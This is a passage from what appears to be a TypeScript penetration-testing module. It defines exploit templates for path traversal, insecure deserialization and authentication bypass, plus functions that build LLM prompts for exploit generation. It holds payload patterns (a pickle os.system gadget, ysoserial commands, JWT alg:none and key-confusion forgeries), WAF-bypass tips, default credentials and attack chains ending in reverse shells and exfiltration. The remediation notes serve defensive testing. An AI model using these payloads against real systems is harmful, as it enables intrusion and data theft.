        'Path normalization bypass: ....// or ..;/',
      ],
      encodingNotes: [
        'URL-encode path separators',
        'Double-encode for WAF bypass',
        'Use alternate path separators on Windows',
      ],
    },
    escalation: {
      paths: [
        { name: 'Credential Extraction', description: 'Read config files with credentials', requiredAccess: 'lfi', targetAccess: 'credential_access', technique: 'Read .env, config files, SSH keys' },
        { name: 'Source Code Disclosure', description: 'Read application source code', requiredAccess: 'lfi', targetAccess: 'file_read', technique: 'Traverse to application directory' },
        { name: 'RCE via Log Poisoning', description: 'Execute code via log inclusion', requiredAccess: 'lfi', targetAccess: 'command_execution', technique: 'Log poisoning + file inclusion' },
      ],
      chainOpportunities: [
        'LFI → credential extraction → database access → data exfiltration',
        'LFI → SSH key extraction → lateral movement',
        'LFI → log poisoning → RCE → reverse shell',
        'LFI → source code → find more vulns → deeper exploitation',
      ],
    },
    evidence: {
      requiredCaptures: ['Traversal payload', 'File content extracted', 'Multiple files read'],
      screenshots: ['File content in response', 'Sensitive data extracted'],
      reportData: ['Traversal depth required', 'Files accessible', 'Sensitive data found'],
      fedRampNotes: ['Document all sensitive files accessed', 'Note credential exposure'],
    },
    remediation: [
      'Use allowlist of permitted file paths',
      'Canonicalize paths and validate against base directory',
      'Avoid user input in file path operations',
      'Use chroot or containerization to limit file access',
    ],
    pitfalls: [
      'Only testing ../ — test encoding variants and alternate separators',
      'Assuming Linux — target may be Windows',
      'Not testing for LFI-to-RCE chains',
      'Missing blind LFI (no error messages)',
    ],
  },

  // ─────────────────────────────────────────────────────────────────
  // INSECURE DESERIALIZATION
  // ─────────────────────────────────────────────────────────────────
  deserialization: {
    vulnClass: 'deserialization',
    name: 'Insecure Deserialization',
    wstgIds: ['WSTG-INPV-04'],
    attackTechniques: ['T1059', 'T1190'],
    cweIds: ['CWE-502'],
    detection: {
      signals: [
        'Serialized objects in cookies, parameters, or headers',
        'Base64-encoded data that decodes to object structures',
        'Java serialized objects (magic bytes: AC ED 00 05)',
        'PHP serialized data (O:4:"User":...)',
        'Python pickle data',
        '.NET ViewState or serialized objects',
      ],
      indicators: [
        'Binary data in cookies or hidden fields',
        'Base64 data that decodes to structured objects',
        'Error messages mentioning deserialization/unmarshalling',
        'ClassNotFoundException or similar type errors',
      ],
      techniques: [
        'Identify serialization format from data patterns',
        'Modify serialized object properties and observe behavior',
        'Test with ysoserial (Java), phpggc (PHP), or custom gadgets',
        'Check for type confusion by changing object class',
      ],
      falsePositives: [
        'Base64-encoded JSON (not serialized objects)',
        'Encrypted data that looks like serialized objects',
      ],
    },
    validation: {
      confirmationSteps: [
        'Identify serialization format and decode the object',
        'Modify a non-critical property and verify server processes it',
        'Test with a time-delay gadget chain',
        'Test with OOB callback gadget chain',
      ],
      proofPayloads: [
        'Modified serialized object with changed property',
        'ysoserial CommonsCollections payload (Java)',
        'phpggc gadget chain (PHP)',
        'Pickle payload with os.system (Python)',
      ],
      expectedResponses: [
        'Modified property reflected in application behavior',
        'Time delay from gadget chain execution',
        'OOB callback from gadget chain',
      ],
      truePositiveMarkers: [
        'Server deserializes and processes modified objects',
        'Gadget chain executes (time delay or OOB)',
        'Can control object properties that affect application logic',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'Java gadget chain RCE',
          condition: 'When Java serialization detected with vulnerable libraries',
          approach: 'Use ysoserial to generate gadget chain for command execution',
          pattern: 'java -jar ysoserial.jar {GadgetChain} "{command}" | base64',
          expectedOutcome: 'OS command execution on server',
        },
        {
          name: 'PHP object injection',
          condition: 'When PHP unserialize() used on user input',
          approach: 'Craft PHP serialized object with magic methods (__destruct, __wakeup)',
          pattern: 'O:8:"Classname":1:{s:4:"prop";s:N:"{payload}";}',
          expectedOutcome: 'Code execution via magic method chain',
        },
        {
          name: 'Python pickle RCE',
          condition: 'When Python pickle.loads() used on user input',
          approach: 'Craft pickle payload with __reduce__ method',
          pattern: "pickle.dumps(type('X',(),{'__reduce__':lambda s:(__import__('os').system,('id',))})())",
          expectedOutcome: 'OS command execution',
        },
      ],
      environmentNotes: {
        java: 'Use ysoserial. Check for Commons Collections, Spring, Groovy libraries.',
        php: 'Use phpggc. Check for Laravel, Symfony, WordPress gadget chains.',
        python: 'Pickle is always dangerous. Check for yaml.load(), jsonpickle.',
        dotnet: 'Use ysoserial.net. Check for BinaryFormatter, ObjectStateFormatter.',
      },
      wafBypassNotes: [
        'Encode serialized data to bypass pattern matching',
        'Use alternative gadget chains if primary is blocked',
        'Fragment payload across multiple parameters',
      ],
      encodingNotes: [
        'Base64 encode serialized objects',
        'URL-encode binary data',
        'Use gzip compression before encoding',
      ],
    },
    escalation: {
      paths: [
        { name: 'RCE via Gadget Chain', description: 'Execute OS commands', requiredAccess: 'deserialization', targetAccess: 'command_execution', technique: 'Gadget chain exploitation' },
        { name: 'Authentication Bypass', description: 'Modify user object properties', requiredAccess: 'deserialization', targetAccess: 'service_account', technique: 'Object property manipulation' },
      ],
      chainOpportunities: [
        'Deserialization → RCE → reverse shell → privilege escalation',
        'Deserialization → auth bypass → admin access → further exploitation',
      ],
    },
    evidence: {
      requiredCaptures: ['Serialized object format', 'Modified/malicious payload', 'Execution proof'],
      screenshots: ['Gadget chain execution', 'Command output'],
      reportData: ['Serialization format', 'Vulnerable library/version', 'Gadget chain used'],
      fedRampNotes: ['Document RCE capability', 'Note library versions for patching'],
    },
    remediation: [
      'Never deserialize untrusted data',
      'Use safe serialization formats (JSON) instead of native serialization',
      'Implement integrity checks (HMAC) on serialized data',
      'Keep libraries updated to patch known gadget chains',
      'Use allowlists for deserialization classes',
    ],
    pitfalls: [
      'Not recognizing serialized data formats',
      'Only testing with one gadget chain — try multiple',
      'Missing blind deserialization (no direct output)',
      'Assuming JSON APIs are safe — check for nested serialized data',
    ],
  },

  // ─────────────────────────────────────────────────────────────────
  // AUTHENTICATION BYPASS
  // ─────────────────────────────────────────────────────────────────
  auth_bypass: {
    vulnClass: 'auth_bypass',
    name: 'Authentication Bypass',
    wstgIds: ['WSTG-ATHN-01', 'WSTG-ATHN-04', 'WSTG-ATHN-06'],
    attackTechniques: ['T1078', 'T1110'],
    cweIds: ['CWE-287', 'CWE-306'],
    detection: {
      signals: [
        'Login forms and authentication endpoints',
        'JWT/session token handling',
        'Password reset functionality',
        'OAuth/SSO implementations',
        'API key authentication',
      ],
      indicators: [
        'Default credentials accepted',
        'JWT with none algorithm accepted',
        'Session tokens predictable or reusable',
        'Password reset tokens guessable',
        'IDOR in authentication context',
      ],
      techniques: [
        'Test default credentials (admin/admin, admin/password)',
        'Test JWT manipulation (none algorithm, key confusion)',
        'Test session fixation and prediction',
        'Test password reset flow for token weaknesses',
        'Test OAuth misconfigurations (redirect_uri, state)',
      ],
      falsePositives: [
        'Account lockout after N attempts (security feature, not bypass)',
        'Rate limiting on login (security feature)',
      ],
    },
    validation: {
      confirmationSteps: [
        'Attempt login with default/common credentials',
        'Decode and analyze JWT structure',
        'Test session token entropy and predictability',
        'Test password reset token reuse/prediction',
        'Verify access to protected resources after bypass',
      ],
      proofPayloads: [
        'admin:admin, admin:password, root:root',
        'JWT with alg:none and modified claims',
        'JWT with HS256 using public key as secret (RS256→HS256 confusion)',
        'Manipulated OAuth redirect_uri',
      ],
      expectedResponses: [
        'Successful authentication with unauthorized credentials',
        'Access to protected resources without valid session',
        'Elevated privileges after token manipulation',
      ],
      truePositiveMarkers: [
        'Can access authenticated endpoints without valid credentials',
        'Can impersonate other users via token manipulation',
        'Can escalate privileges via authentication flaws',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'JWT none algorithm',
          condition: 'When JWT validation accepts alg:none',
          approach: 'Set JWT algorithm to none and modify claims',
          pattern: '{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.""',
          expectedOutcome: 'Authentication as any user/role',
        },
        {
          name: 'JWT key confusion (RS256→HS256)',
          condition: 'When server accepts both RS256 and HS256',
          approach: 'Sign JWT with HS256 using the RS256 public key as the secret',
          pattern: 'jwt.sign(payload, publicKey, {algorithm: "HS256"})',
          expectedOutcome: 'Forged JWT accepted by server',
        },
        {
          name: 'Password reset token prediction',
          condition: 'When reset tokens have low entropy or are time-based',
          approach: 'Generate multiple reset tokens and analyze patterns',
          pattern: 'Request multiple tokens, analyze for sequential/time-based patterns',
          expectedOutcome: 'Predict valid reset token for target account',
        },
      ],
      environmentNotes: {
        jwt: 'Check for none algorithm, key confusion, weak secrets, expired token acceptance.',
        oauth: 'Check redirect_uri validation, state parameter, token leakage.',
        saml: 'Check for XML signature wrapping, assertion manipulation.',
        session: 'Check entropy, fixation, prediction, concurrent session handling.',
      },
      wafBypassNotes: [
        'Use case variation in JWT headers',
        'URL-encode OAuth parameters',
        'Use alternate token formats',
      ],
      encodingNotes: [
        'Base64url encoding for JWT',
        'URL encoding for OAuth parameters',
      ],
    },
    escalation: {
      paths: [
        { name: 'Account Takeover', description: 'Access any user account', requiredAccess: 'auth_bypass', targetAccess: 'service_account', technique: 'Token manipulation or credential theft' },
        { name: 'Admin Access', description: 'Escalate to admin role', requiredAccess: 'auth_bypass', targetAccess: 'command_execution', technique: 'Role manipulation in JWT/session' },
      ],
      chainOpportunities: [
        'Auth bypass → admin access → application admin → RCE',
        'Auth bypass → account takeover → data exfiltration',
        'Auth bypass → API access → further exploitation',
      ],
    },
    evidence: {
      requiredCaptures: ['Authentication bypass method', 'Manipulated token/credential', 'Access to protected resources'],
      screenshots: ['Successful unauthorized access', 'Token manipulation proof'],
      reportData: ['Authentication mechanism', 'Bypass technique', 'Accessible resources/roles'],
      fedRampNotes: ['Document authentication control failure', 'Note affected user population'],
    },
    remediation: [
      'Enforce strong JWT validation (reject none algorithm, validate key type)',
      'Use high-entropy session tokens with proper expiration',
      'Implement account lockout and rate limiting',
      'Validate OAuth redirect_uri against strict allowlist',
      'Use MFA for sensitive operations',
    ],
    pitfalls: [
      'Only testing username/password — check JWT, OAuth, API keys',
      'Missing token manipulation attacks',
      'Not testing concurrent session handling',
      'Assuming HTTPS prevents credential theft',
    ],
  },
};

// ═══════════════════════════════════════════════════════════════════════
// §3 — TEMPLATE LOOKUP & LLM CONTEXT GENERATION
// ═══════════════════════════════════════════════════════════════════════

export function getTemplate(vulnClass: string): ExploitTemplate | undefined {
  return VULN_TEMPLATES[vulnClass];
}

export function getAvailableTemplates(): string[] {
  return Object.keys(VULN_TEMPLATES);
}

/**
 * Generate LLM context from a template for exploit generation prompts.
 * Provides the LLM with structured reasoning framework instead of static payloads.
 */
export function generateTemplateContext(
  vulnClass: string,
  phase: 'detection' | 'validation' | 'exploitation' | 'escalation' | 'all' = 'all',
): string {
  const template = VULN_TEMPLATES[vulnClass];
  if (!template) return `No template available for vulnerability class: ${vulnClass}`;

  const sections: string[] = [];
  sections.push(`=== ${template.name} Exploit Template ===`);
  sections.push(`OWASP WSTG: ${template.wstgIds.join(', ')}`);
  sections.push(`ATT&CK: ${template.attackTechniques.join(', ')}`);
  sections.push(`CWE: ${template.cweIds.join(', ')}`);
  sections.push('');

  if (phase === 'all' || phase === 'detection') {
    sections.push('--- DETECTION ---');
    sections.push('Signals: ' + template.detection.signals.join('; '));
    sections.push('Techniques: ' + template.detection.techniques.join('; '));
    sections.push('');
  }

  if (phase === 'all' || phase === 'validation') {
    sections.push('--- VALIDATION ---');
    sections.push('Steps: ' + template.validation.confirmationSteps.join(' → '));
    sections.push('Proof payloads: ' + template.validation.proofPayloads.join('; '));
    sections.push('True positive markers: ' + template.validation.truePositiveMarkers.join('; '));
    sections.push('');
  }

  if (phase === 'all' || phase === 'exploitation') {
    sections.push('--- EXPLOITATION STRATEGIES ---');
    for (const strategy of template.exploitation.strategies) {
      sections.push(`Strategy: ${strategy.name}`);
      sections.push(`  When: ${strategy.condition}`);
      sections.push(`  Approach: ${strategy.approach}`);
      sections.push(`  Pattern: ${strategy.pattern}`);
      sections.push('');
    }
    sections.push('WAF Bypass: ' + template.exploitation.wafBypassNotes.join('; '));
    sections.push('');
  }

  if (phase === 'all' || phase === 'escalation') {
    sections.push('--- ESCALATION ---');
    for (const path of template.escalation.paths) {
      sections.push(`${path.name}: ${path.description} (${path.requiredAccess} → ${path.targetAccess})`);
    }
    sections.push('Chain opportunities: ' + template.escalation.chainOpportunities.join('; '));
    sections.push('');
  }

  sections.push('--- PITFALLS ---');
  sections.push(template.pitfalls.join('; '));

  return sections.join('\n');
}

/**
 * Get environment-specific notes for a template.
 */
export function getEnvironmentNotes(vulnClass: string, environment: string): string {
  const template = VULN_TEMPLATES[vulnClass];
  if (!template) return '';
  return template.exploitation.environmentNotes[environment] || '';
}

/**
 * Get all templates matching a set of CWE IDs.
 */
export function getTemplatesByCwe(cweIds: string[]): ExploitTemplate[] {
  return Object.values(VULN_TEMPLATES).filter(t =>
    t.cweIds.some(cwe => cweIds.includes(cwe)),
  );
}

/**
 * Get all templates matching ATT&CK technique IDs.
 */
export function getTemplatesByAttack(techniqueIds: string[]): ExploitTemplate[] {
  return Object.values(VULN_TEMPLATES).filter(t =>
    t.attackTechniques.some(tech => techniqueIds.includes(tech)),
  );
}
